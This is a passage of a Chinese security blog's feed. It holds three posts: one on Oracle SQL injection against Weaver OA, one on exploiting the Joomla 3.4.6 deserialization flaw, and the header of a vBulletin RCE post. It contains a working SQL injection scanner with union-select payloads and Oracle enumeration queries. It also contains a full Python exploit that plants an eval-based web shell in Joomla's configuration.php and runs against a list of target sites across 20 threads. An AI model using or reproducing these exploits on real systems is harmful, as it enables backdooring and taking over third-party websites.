class="string">"formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res=requests.post(url=url,data=payload,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line">res.encoding=res.apparent_encoding</span><br><span class="line"><span class="comment">#print res.text</span></span><br><span class="line"><span class="keyword">if</span> len(res.text) &gt; <span class="number">23</span>:</span><br><span class="line"><span class="keyword">if</span> (<span class="string">'id'</span> <span class="keyword">in</span> res.text) <span class="keyword">and</span> (<span class="string">'wf_'</span> <span class="keyword">in</span> res.text) <span class="keyword">and</span> (<span class="string">'draggable'</span> <span class="keyword">in</span> res.text):</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] '</span>+target+<span class="string">'is vuluable!'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] '</span>+url+<span class="string">'is no vulu'</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[!] '</span>+target+<span class="string">' error'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">target= <span class="string">'zhengbao.wang'</span></span><br><span class="line">sql_test(target)</span><br></pre></td></tr></table></figure><h2 id="0x02-oracle数据库注入语句"><a href="#0x02-oracle数据库注入语句" class="headerlink" title="0x02 oracle数据库注入语句"></a>0x02 oracle数据库注入语句</h2><p>记录一下Oracle联合注入的一些语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">当前数据库版本 （<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$<span class="keyword">version</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>）</span><br><span class="line">服务器监听IP (<span class="keyword">select</span> utl_inaddr.get_host_address <span class="keyword">from</span> dual)</span><br><span class="line">服务器操作系统 （<span class="keyword">select</span> <span class="keyword">member</span> <span class="keyword">from</span> v$<span class="keyword">logfile</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>）</span><br><span class="line">服务器<span class="keyword">sid</span> (<span class="keyword">select</span> instance_name <span class="keyword">from</span> v$<span class="keyword">instance</span>)</span><br><span class="line">当前连接用户 (<span class="keyword">select</span> SYS_CONTEXT (<span class="string">'USERENV'</span>, <span class="string">'CURRENT_USER'</span>) <span class="keyword">from</span> dual)</span><br><span class="line">当前用户 (<span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> dual)</span><br></pre></td></tr></table></figure><p>例如获取数据库版本<code>select banner from sys.v_$version where rownum=1</code></p><p><img src="https://i.loli.net/2019/10/11/bUwImJ2lSMFrHsN.png" alt></p><p>获取数据库名</p><p><code>select owner from all_tables where rownum=1</code></p><p><img src="https://i.loli.net/2019/10/11/aBQtDmcHjlhRFIW.png" alt></p><p>这里要想查询第二个数据库名要使用<code>&lt;&gt;&#39;SYS&#39;</code>筛选掉第一个查询出来的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span> <span class="keyword">and</span> owner &lt;&gt;<span class="string">'SYS'</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/11/cHDLXiRsZ6PWN1v.png" alt></p><p>获取表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/11/iOVW9vnw1k5BShR.png" alt></p><p>获取列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name=<span class="string">'ACTIONEXECUTELOG'</span> <span class="keyword">and</span> <span class="keyword">rownum</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/11/Sdo9KtNIlQTn3PL.png" alt></p><p>同样查询第二列需要筛选掉第一列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name=<span class="string">'ACTIONEXECUTELOG'</span> <span class="keyword">and</span> <span class="keyword">rownum</span>=<span class="number">1</span> <span class="keyword">and</span> column_name&lt;&gt;<span class="string">'ID'</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/11/3aFjrBhOmy1dAVR.png" alt></p><p>查询更多的列可以继续筛选掉已查出的列名</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">ID</span>,ACTIONID <span class="keyword">from</span> ACTIONEXECUTELOG</span><br></pre></td></tr></table></figure><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://mp.weixin.qq.com/s/s83vsNyhnbtmDAV3SXwkyg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/s83vsNyhnbtmDAV3SXwkyg</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;泛微提供了移动办公、微信办公、协同办公(OA)、流程管理、信息门户、知识管理、费控管理等功能，适用于
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="sql注入" scheme="http://zhengbao.wang/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>joomla 3.4.6反序列化漏洞利用</title>
    <link href="http://zhengbao.wang/joomla3-4-6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://zhengbao.wang/joomla3-4-6反序列化漏洞利用/</id>
    <published>2019-10-09T08:58:25.000Z</published>
    <updated>2019-10-09T09:05:16.918Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>joomla!是一套全球知名的内容管理系统，在此之前，joomla曾爆出过严重的反序列化漏洞<code>CVE-2015-8562</code>,当时，在<code>3.4.6</code>之后的版本中被修复。</p><p>Joomla会话作为PHP对象存储在数据库中，并由PHP会话函数处理。这是一个有趣的攻击媒介，因为会话也为未经身份验证的用户存储，因此在那里的对象注入会导致未经身份验证的RCE。此次影响的版本为<code>3.0.0-3.4.6</code></p><h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>10月7号，关于joomla 3.4.6的反序列化漏洞poc被公布。</p><p>环境搭建，<code>joomla 3.4.6</code>下载地址<a href="https://downloads.joomla.org/it/cms/joomla3/3-4-6" target="_blank" rel="noopener">https://downloads.joomla.org/it/cms/joomla3/3-4-6</a></p><p>我在原有脚本的基础上修改了一点进行简单利用，原版可参见<a href="https://cn.0day.today/exploit/33327" target="_blank" rel="noopener">https://cn.0day.today/exploit/33327</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> colored</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">PROXS = &#123;<span class="string">'http'</span>:<span class="string">'127.0.0.1:8080'</span>&#125;</span><br><span class="line">PROXS = &#123;&#125;</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">'boogle'</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_info</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[*] "</span> + str,<span class="string">"cyan"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_ok</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[+] "</span>+ str,<span class="string">"green"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_error</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[-] "</span>+ str,<span class="string">"red"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_warning</span><span class="params">(str)</span>:</span></span><br><span class="line">        print(colored(<span class="string">"[!!] "</span> + str,<span class="string">"yellow"</span>))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(url, cook)</span>:</span></span><br><span class="line">        token = <span class="string">''</span></span><br><span class="line">        resp = requests.get(url, cookies=cook, proxies = PROXS)</span><br><span class="line">        html = BeautifulSoup(resp.text,<span class="string">'html.parser'</span>)</span><br><span class="line">        <span class="comment"># csrf token is the last input</span></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> html.find_all(<span class="string">'input'</span>):</span><br><span class="line">                csrf = v</span><br><span class="line">        csrf = csrf.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="keyword">return</span> csrf</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_error</span><span class="params">(url, cook)</span>:</span></span><br><span class="line">        resp = requests.get(url, cookies = cook, proxies = PROXS)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Failed to decode session object'</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                <span class="comment">#print(resp.text)</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment">#print(resp.text)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cook</span><span class="params">(url)</span>:</span></span><br><span class="line">        resp = requests.get(url, proxies=PROXS)</span><br><span class="line">        <span class="comment">#print(resp.cookies)</span></span><br><span class="line">        <span class="keyword">return</span> resp.cookies</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_req</span><span class="params">(url , object_payload)</span>:</span></span><br><span class="line">        <span class="comment"># just make a req with object</span></span><br><span class="line">        <span class="comment">#print_info('Getting Session Cookie ..')</span></span><br><span class="line">        cook = get_cook(url)</span><br><span class="line">        <span class="comment">#print_info('Getting CSRF Token ..')</span></span><br><span class="line">        csrf = get_token(url, cook)</span><br><span class="line"> </span><br><span class="line">        user_payload = <span class="string">'\\0\\0\\0'</span> * <span class="number">9</span></span><br><span class="line">        padding = <span class="string">'AAA'</span> <span class="comment"># It will land at this padding</span></span><br><span class="line">        working_test_obj = <span class="string">'s:1:"A":O:18:"PHPObjectInjection":1:&#123;s:6:"inject";s:10:"phpinfo();";&#125;'</span></span><br><span class="line">        clean_object = <span class="string">'A";s:5:"field";s:10:"AAAAABBBBB'</span> <span class="comment"># working good without bad effects</span></span><br><span class="line"> </span><br><span class="line">        inj_object = <span class="string">'";'</span></span><br><span class="line">        inj_object += object_payload</span><br><span class="line">        inj_object += <span class="string">'s:6:"return";s:102:'</span> <span class="comment"># end the object with the 'return' part</span></span><br><span class="line">        password_payload = padding + inj_object</span><br><span class="line"></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">'username'</span>: user_payload,</span><br><span class="line">            <span class="string">'password'</span>: password_payload,</span><br><span class="line">            <span class="string">'option'</span>:<span class="string">'com_users'</span>,</span><br><span class="line">            <span class="string">'task'</span>:<span class="string">'user.login'</span>,</span><br><span class="line">            csrf :<span class="string">'1'</span></span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">#print_info('Sending request ..')</span></span><br><span class="line">        resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)</span><br><span class="line">        <span class="keyword">return</span> resp.text</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_backdoor_pay</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="comment"># This payload will backdoor the the configuration .PHP with an eval on POST request </span></span><br><span class="line">        function = <span class="string">'assert'</span></span><br><span class="line">        template = <span class="string">'s:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:&#123;s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:&#123;&#125;s:21:"\\0\\0\\0disconnectHandlers";a:1:&#123;i:0;a:2:&#123;i:0;O:9:"SimplePie":5:&#123;s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:&#123;&#125;s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";&#125;i:1;s:4:"init";&#125;&#125;s:13:"\\0\\0\\0connection";i:1;&#125;'</span></span><br><span class="line"></span><br><span class="line">        payload =  <span class="string">'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\''</span> + cmd +<span class="string">'\\\'])) eval($_POST[\\\''</span>+cmd+<span class="string">'\\\']);\', FILE_APPEND) || $a=\'http://xxx\';'</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        function_len = len(function)</span><br><span class="line">        final = template.replace(<span class="string">'PAYLOAD'</span>,payload).replace(<span class="string">'LENGTH'</span>, str(len(payload))).replace(<span class="string">'FUNC_NAME'</span>, function).replace(<span class="string">'FUNC_LEN'</span>, str(len(function)))</span><br><span class="line">        <span class="keyword">return</span> final</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_backdoor</span><span class="params">(url,param_name)</span>:</span></span><br><span class="line">        res = requests.post(url + <span class="string">'/configuration.php'</span>, data=&#123;param_name:<span class="string">'echo \'PWNED\';'</span>&#125;, proxies = PROXS)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'PWNED'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_backdoor</span><span class="params">(url, payload_code)</span>:</span></span><br><span class="line">        <span class="comment"># Execute PHP code from the backdoor</span></span><br><span class="line">        res = requests.post(url + <span class="string">'/configuration.php'</span>, data=&#123;cmd:payload_code&#125;, proxies = PROXS)</span><br><span class="line">        print(res.text)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(url)</span>:</span></span><br><span class="line"></span><br><span class="line">        target_url = url + <span class="string">'/index.php/component/users'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            make_req(target_url, get_backdoor_pay())</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print_warning(<span class="string">'exploit error,no index.php/component/users'</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> ping_backdoor(url, cmd):</span><br><span class="line">                    print_ok(<span class="string">'Backdoor implanted, eval your code at '</span> + url + <span class="string">'/configuration.php in a POST with '</span> + cmd)</span><br><span class="line">                    file_write(<span class="string">'joomla_vulu_site.txt'</span>,url+<span class="string">"\n"</span>)</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print_error(url +<span class="string">' is not vuluable'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print_warning(<span class="string">'ping_backdoor error'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bruter</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, urls,threads)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.vb_urls = Queue.Queue()</span><br><span class="line">        self.threads = threads</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> urls:</span><br><span class="line">            self.vb_urls.put(u[<span class="number">0</span>])</span><br><span class="line">        <span class="comment">#print self.vb_urls.get()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">vb5_rce</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> threading.Lock():</span><br><span class="line">            <span class="keyword">while</span> self.vb_urls.qsize() &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">                target = self.vb_urls.get()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">                    target = <span class="string">'http://'</span>+target</span><br><span class="line">                exploit(target)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span>  range(self.threads):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] thread '</span>+ str(i)</span><br><span class="line">            t = threading.Thread(target=self.vb5_rce)</span><br><span class="line">            t.start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'joomla.txt'</span>,<span class="string">'r'</span>)  <span class="keyword">as</span> f:</span><br><span class="line">        r = json.loads(f.read())</span><br><span class="line">        urls = r[<span class="string">'results'</span>]</span><br><span class="line">        <span class="keyword">return</span> urls</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_write</span><span class="params">(name,results)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,mode=<span class="string">'a'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(results)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    urls = get_url()</span><br><span class="line">    vb5_rce = Bruter(urls=urls,threads=<span class="number">20</span>)</span><br><span class="line">    vb5_rce.run()</span><br></pre></td></tr></table></figure><p>利用成功后将在配置文件<code>configuration.php</code>中写入一句话</p><p><img src="https://i.loli.net/2019/10/09/9GsNPzMhqFYIvoW.png" alt></p><p>然后便可以进一步的利用</p><p><img src="https://i.loli.net/2019/10/09/YlZ7iCfRIGr5bND.png" alt></p><p>至此简单利用成功，后面有时间的话，继续对漏洞产生原因出一篇分析文章。</p><h2 id="0x02-参考链接"><a href="#0x02-参考链接" class="headerlink" title="0x02 参考链接"></a>0x02 参考链接</h2><p><a href="https://cn.0day.today/exploit/33327" target="_blank" rel="noopener">https://cn.0day.today/exploit/33327</a></p><p><a href="https://blog.hacktivesecurity.com/index.php?controller=post&amp;action=view&amp;id_post=41" target="_blank" rel="noopener">https://blog.hacktivesecurity.com/index.php?controller=post&amp;action=view&amp;id_post=41</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;joomla!是一套全球知名的内容管理系统，在此之前，joomla曾爆出过严重的反序列化漏洞&lt;cod
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="反序列化" scheme="http://zhengbao.wang/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>vBulletin 5.x远程代码执行漏洞利用</title>
    <link href="http://zhengbao.wang/vBulletin-5-x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://zhengbao.wang/vBulletin-5-x远程代码执行漏洞利用/</id>
    <published>2019-10-08T07:31:39.000Z</published>
    <updated>2019-10-08T07:55:22.490Z</updated>
    
